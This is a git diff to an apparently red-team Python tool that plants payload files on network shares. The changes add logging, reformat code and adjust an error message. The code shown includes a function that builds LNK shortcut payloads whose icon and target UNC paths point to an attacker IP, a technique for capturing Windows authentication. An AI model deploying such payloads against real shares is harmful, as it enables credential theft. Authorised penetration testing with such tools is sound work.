@@ -8,6 +8,7 @@ bulk cleanup multiple types of payloads from the identified locations.
 
 from datetime import datetime, timedelta
 from pathlib import Path
+import logging
 import linksiren.target
 
 
@@ -72,18 +73,18 @@ def is_valid_payload_name(payload_name, available_extensions):
     Accepts a potential payload name. Validates the payload name has an extension and that the
     extension is supported. Returns True if the payload name is valid or False if it is not.
     """
+    logger = logging.getLogger("main_logger")
     invalid_payload_message = (
-        "Invalid payload extension provided. Payload must end in one of the"
-        "following:"
+        "Invalid payload extension provided. Payload must end in one of the" "following:\n\t"
     )
+
     for available_extension in available_extensions:
-        invalid_payload_message = invalid_payload_message + (
-            f"\n\t.{available_extension}"
-        )
+        invalid_payload_message = invalid_payload_message + (f"{available_extension}\t")
 
     payload_extension = Path(payload_name).suffix
     if payload_extension not in available_extensions:
-        print(invalid_payload_message)
+        logger.error(invalid_payload_message, extra={"path": payload_name})
+        print(invalid_payload_message + f"\n\tProvided Extension: {payload_extension}")
         is_valid = False
     else:
         is_valid = True
@@ -116,8 +117,14 @@ def create_lnk_payload(attacker_ip, template_bytes):
     img_unc_path = f"\\\\{attacker_ip}\\test.ico"
     target_unc_path = f"\\\\{attacker_ip}\\test"
 
+    logger = logging.getLogger("main_logger")
+
     if len(img_unc_path) >= max_path or len(target_unc_path) >= max_path:
-        print("Path name too long for lnk template, skipping.")
+        logger.error(
+            "Length of the image UNC path (%s) is greater than the maximum of %d.",
+            img_unc_path,
+            max_path,
+        )
         return False
 
     img_unc_path = (img_unc_path + "\x00").encode("utf-16le")
@@ -216,9 +223,7 @@ def filter_targets(targets, sorted_rankings, max_folders_per_target):
 
         # Sort the matching share paths based on their ranking in descending order
         # and subsorted by key in alphabetical order. Keep only the top N.
-        sorted_matching_paths = sorted(
-            matching_paths, key=lambda key: (-sorted_rankings[key], key)
-        )
+        sorted_matching_paths = sorted(matching_paths, key=lambda key: (-sorted_rankings[key], key))
 
         # Keep only the top N
         top_matching_paths = sorted_matching_paths[:max_folders_per_target]
